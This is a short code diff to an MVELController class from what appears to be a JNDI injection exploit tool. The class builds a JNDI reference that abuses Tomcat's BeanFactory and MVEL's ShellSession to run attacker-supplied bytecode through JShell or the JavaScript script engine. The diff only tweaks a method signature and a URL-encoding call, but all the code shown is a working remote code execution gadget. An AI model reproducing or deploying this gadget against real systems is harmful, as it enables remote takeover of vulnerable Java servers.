@@ -16,7 +16,7 @@ import java.net.URLEncoder;
 @JNDIMapping("/MVEL")
 public class MVELController extends BasicController {
     @Override
-    public Object process(byte[] byteCode) {
+    public Object process(byte[] byteCode) throws Exception {
         System.out.println("[Reference] Factory: BeanFactory + MVEL");
 
         ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
@@ -24,7 +24,7 @@ public class MVELController extends BasicController {
 
         if (Main.config.jshell) {
             String code = JShellPayload.loadClass(byteCode);
-            ref.add(new StringRefAddr("x", "push Class.forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(java.net.URLDecoder.decode(\"" + URLEncoder.encode(code) + "\"));"));
+            ref.add(new StringRefAddr("x", "push Class.forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(java.net.URLDecoder.decode(\"" + URLEncoder.encode(code, "UTF-8") + "\"));"));
         } else {
             String code = JavaScriptPayload.loadClass(byteCode);
             ref.add(new StringRefAddr("x", "push Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + MiscUtil.encodeUnicode(code) + "\");"));
